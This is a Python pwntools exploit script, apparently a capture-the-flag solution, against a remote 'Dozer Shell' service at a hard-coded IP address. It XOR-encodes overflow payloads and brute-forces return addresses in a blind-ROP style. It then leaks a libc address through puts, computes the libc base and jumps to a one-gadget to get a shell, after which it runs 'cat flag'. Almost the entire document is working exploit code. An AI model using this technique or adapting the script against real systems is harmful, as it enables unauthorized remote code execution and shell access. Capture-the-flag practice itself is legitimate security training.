from pwn import*
#context.log_level ='DEBUG'
def m(payload):
	retval = ""
	for i in payload:
		if i == '\x06':
			retval += chr((ord(i) + 1)^6)
		elif i == '\x00':
			retval += i
		else:
			retval += chr(ord(i)^6)
	return retval
def leak_main(length,address):
	for i in range(255):
		p =remote('118.31.11.216',30009)
		try:
			p.recvuntil('[*] ---------------- Dozer Shell ----------------\n')
			log.info('ADDRESS\t' + hex(address))
			p.sendline('U'*length + m(p64(address)))
			output = p.recvline()
			log.info('OUT:\t' + output)
			p.interactive()
		except:
			p.close()
			address = address + 1
			continue
def get_brop(length,address,stop):
	p =remote('118.31.11.216',30009)
	try:
		p.recvuntil('[*] ---------------- Dozer Shell ----------------\n')
		log.info('ADDRESS\t' + hex(address))
		p.sendline('U'*length + m(p64(address)) + 'U'*8*6 + m(p64(stop)) + 'U'*0x10)
		output = p.recvline()
		log.info('OUT:\t' + output)
		p.interactive()
	except:
		p.close()

'''
for i in range(10):
	tmp = 0x400101
	for n in range(10):
		leak_main(length,tmp)
		tmp += 0x100
	length += 1
'''

length = 0x58
main = 0x400796
puts = 0x4007DB
offet = 0x6F
libc =ELF('./libc-2.23.so')
for i in range(0x200):
	p =remote('118.31.11.216',30009)
	try:
		p.recvuntil('[*] ---------------- Dozer Shell ----------------\n')
		p.sendline('U'*length + m(p64(puts)))
		p.recv(0x38)
		libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - 0x738 -  0x6F*0x1000
		log.info('LIBC:\t' + hex(libc_base))
		'''
		p.sendline('U'*length +  m(p64(main)))
		p.recvuntil('[*] ---------------- Dozer Shell ----------------\n')
		'''
		p.sendline('U'*length + m(p64(libc_base + 0xF1147)))
		log.info('INDEX:\t' + hex(i))
		p.sendline('cat flag')
		p.recvuntil('ctf')
		output = p.recvuntil('}')
		log.info("FLAG:\t" + 'ctf' + output)
		break
	except:
		p.close()
		continue
p.interactive()
